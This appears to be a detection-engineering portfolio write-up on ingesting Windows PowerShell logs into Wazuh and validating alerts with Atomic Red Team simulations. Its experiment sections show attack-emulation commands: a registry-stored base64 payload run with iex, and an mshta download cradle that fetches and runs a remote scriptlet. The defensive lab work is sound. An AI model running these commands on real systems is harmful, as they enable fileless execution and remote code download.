# 🧪 PowerShell Log Source Integration with Wazuh – Sprint 11 Project

## Project Overview

This Sprint 11 project demonstrates the integration of Windows PowerShell Operational logs into a Wazuh SIEM deployment. By enabling native PowerShell logging features and writing custom detection rules, I achieved comprehensive visibility into advanced attacker techniques—such as obfuscated payloads, fileless execution, and mshta-based download cradles—using Atomic Red Team simulations.

**Role:** Detection Engineer / SOC Analyst
**Duration:** 1 week
**Environment:** CloudShare VMs (AD01, ART Workstation)
**Tools:** Wazuh, Windows EventChannel, Group Policy, Atomic Red Team, Kibana, PowerShell

---

## Key Modifications

1. **Group Policy Configuration**

   * Enabled **Script Block Logging** (Event ID 4104)
   * Enabled **Module Logging** (Event ID 4103)
   * (Optional) Enabled Transcription Logging for session records

2. **Wazuh Agent Setup**

   * Updated `ossec.conf` on AD01 to ingest `Microsoft-Windows-PowerShell/Operational` logs via `eventchannel`
   * Restarted `wazuh-agent` service to apply changes

3. **Custom Detection Rules**

   * Created rules in `local_rules.xml` on Wazuh Manager for `win.system.providerName == Microsoft-Windows-PowerShell`
   * Alerting on critical event IDs: `4104`, `4103`, `4688`

4. **Validation & Testing**

   * Executed three Atomic Red Team tests (T1027, Fileless Script, mshta Download Cradle)
   * Verified log ingestion and alerts via Kibana dashboard filters

---

## Experiments & Findings

### Experiment 1 – T1027: Obfuscated Files or Information

**Objective:** Detect base64-encoded PowerShell commands.
**Execution:**

```powershell
$sess = New-PSSession -ComputerName AD01 -Credential (Get-Credential)
Invoke-AtomicTest T1027 -Session $sess
Invoke-AtomicTest T1027 -Session $sess -Cleanup
```

**Findings:**

* Event ID 4104 captured decoded script blocks containing `FromBase64String` and `IEX`.
* Event ID 4103 logged module usage (`System.Text.Encoding`).
* Event ID 4688 showed the PowerShell process creation.

### Experiment 2 – PowerShell Fileless Script Execution

**Objective:** Simulate fileless registry-based payload.
**Execution:**

```powershell
Invoke-Command -Session $sess -ScriptBlock {
  reg.exe add "HKCU:\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "<Base64>" /f
}
Invoke-Command -Session $sess -ScriptBlock {
  iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))
}
Invoke-Command -Session $sess -ScriptBlock {
  Remove-Item -Path "C:\Windows\Temp\art-marker.txt" -Force
  Remove-Item -Path "HKCU:\Software\Classes\AtomicRedTeam" -Force
}
```

**Findings:**

* 4104 logged decoded block writing `art-marker.txt`.
* 4103 tracked `[Convert]` and `[Text.Encoding]` usage.
* 4688 confirmed in-memory execution without intermediary files.

### Experiment 3 – PowerShell Invoke mshta.exe Download Cradle

**Objective:** Emulate a download cradle via `mshta.exe`.
**Execution:**

```powershell
Invoke-Command -Session $sess -ScriptBlock {
  cmd.exe /c "mshta.exe javascript:a=GetObject('script:https://.../mshta.sct').Exec();close()"
}
```

**Findings:**

* 4104 captured the script block with success message.
* 4688 revealed process tree: `cmd.exe` → `mshta.exe` → `powershell.exe`.
* 4103 optionally logged COM interactions.

---

## Conclusion & Lessons Learned

* **Visibility Gaps:** Sysmon alone missed critical PowerShell activity; enabling native logging was essential.
* **Detection Engineering:** Custom Wazuh rules successfully alerted on advanced techniques.
* **Validation Approach:** Real-world ATT\&CK simulations validated end-to-end logging and detection.

---

## References

### Reference 1

**Title:** What’s New in PowerShell: Script Block Logging
**Author:** Microsoft Docs Team
**Author’s affiliation:** Microsoft
**Date published:** January 19, 2023 (Last updated)
**Date accessed:** May 10, 2025
**URL:** [https://learn.microsoft.com/en-us/powershell/scripting/windows-powershell/whats-new/script-logging](https://learn.microsoft.com/en-us/powershell/scripting/windows-powershell/whats-new/script-logging)
**Description:**
This resource was essential in helping me understand how to configure Script Block Logging and Module Logging through Group Policy. It clarified what each logging method captures and which Event IDs are relevant for detection.

---

### Reference 2

**Title:** Atomic Red Team – Adversary Emulation Library
**Author:** Red Canary Security Team
**Author’s affiliation:** Red Canary
**Date published:** Ongoing open-source repository (initial release \~2017)
**Date accessed:** May 10, 2025
**URL:** [https://github.com/redcanaryco/atomic-red-team](https://github.com/redcanaryco/atomic-red-team)
**Description:**
This GitHub repository provided me with hands-on simulations of real-world attack techniques, including the three Atomic tests I used for my PowerShell logging experiments. It was the backbone of my threat emulation and detection validation.

---

### Reference 3

**Title:** MITRE ATT\&CK Technique T1027 – Obfuscated Files or Information
**Author:** MITRE Corporation
**Author’s affiliation:** MITRE
**Date published:** Technique version 2.3 as of February 2023
**Date accessed:** May 10, 2025
**URL:** [https://attack.mitre.org/techniques/T1027/](https://attack.mitre.org/techniques/T1027/)
**Description:**
This reference helped me understand the tactic behind obfuscated PowerShell commands and what to look for in logs. It validated why Script Block Logging is crucial for uncovering encoded or obfuscated command execution.

---

### Reference 4

**Title:** Atomic Test #11 – PowerShell Fileless Script Execution
**Author:** ATC Project Contributors
**Author’s affiliation:** ATC Project (Atomic Threat Coverage)
**Date published:** Public GitHub resource, last commit January 2024
**Date accessed:** May 10, 2025
**URL:** [https://github.com/atc-project/atomic-threat-coverage/blob/master/Atomic\_Threat\_Coverage/Triggers/T1002.md#atomic-test-11---powershell-fileless-script-execution](https://github.com/atc-project/atomic-threat-coverage/blob/master/Atomic_Threat_Coverage/Triggers/T1002.md#atomic-test-11---powershell-fileless-script-execution)
**Description:**
This resource provided the registry-based test I used in Experiment 2 to simulate a fileless PowerShell attack. It was useful for testing logging of decoded script execution without touching the file system.

---

### Reference 5

**Title:** PowerShell mshta Download Cradle – mgreen27
**Author:** Michael Green (@mgreen27)
**Author’s affiliation:** Independent Security Researcher
**Date published:** GitHub Pages site, last commit November 2022
**Date accessed:** May 10, 2025
**URL:** [https://github.com/mgreen27/mgreen27.github.io](https://github.com/mgreen27/mgreen27.github.io)
**Description:**
This was the basis for my third experiment, demonstrating how mshta.exe can be used to download and execute a remote script using PowerShell. It helped test process chain visibility and download cradle detection using Wazuh.
